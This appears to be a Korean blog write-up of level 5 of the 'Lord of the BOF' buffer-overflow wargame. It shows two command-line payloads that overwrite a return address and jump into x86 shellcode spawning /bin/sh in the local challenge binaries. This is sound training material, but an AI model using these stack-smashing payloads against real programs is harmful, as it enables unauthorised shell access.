---
layout: post
title: "The Lord of the BOF - Level 5"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level5/1.jpg" | relative_url }}' alt='relative'>  

## 1) orc/cantata 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level5/2.png" | relative_url }}' alt='relative'>  

앞서 푼 level4 문제에 buffer hunter가 추가되었습니다.  

4번과 같은 방법으로 풀면 어떤 결과가 나타날까요?  

## 2) level4에서 사용한 공격 페이로드 그래도 사용해보기  

``` bash 
// level4에서의 공격 페이로드
./orc `python -c 'print "\x90"*44+"\xfc\xfb\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

<img data-action="zoom" src='{{ "assets/lob/level5/3.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level5/4.png" | relative_url }}' alt='relative'>  

memset 함수가 실행하기 전, 후 스택에 저장된 값의 변화입니다.  
buffer 배열이 memset 함수 실행 후에 0x00으로 채워졌습니다.  

'A'(0x41)이 위치한 주소 중 임의로 하나를 선택해 RET에 넣어주겠습니다.  
저는 0xbffffab0 주소를 임의로 선택했습니다.  

``` bash 
./wolfman `python -c 'print "\x90"*44+"\xb0\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

<img data-action="zoom" src='{{ "assets/lob/level5/5.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level5/6.png" | relative_url }}' alt='relative'>  